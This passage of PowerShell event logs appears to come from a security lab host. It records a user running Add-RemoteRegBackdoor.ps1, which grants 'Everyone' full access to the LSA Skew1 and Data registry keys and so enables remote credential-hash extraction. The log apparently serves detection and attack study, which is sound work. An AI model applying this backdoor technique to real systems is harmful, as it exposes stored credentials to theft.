      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1055

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54727</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1057

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54728</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1059

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54729</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1061

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54730</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1063

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54731</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1065

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54732</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1067

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54733</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1069

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54734</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1071

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54735</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1073

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54736</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1075

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54737</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1077

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54738</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1079

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54739</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1081

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  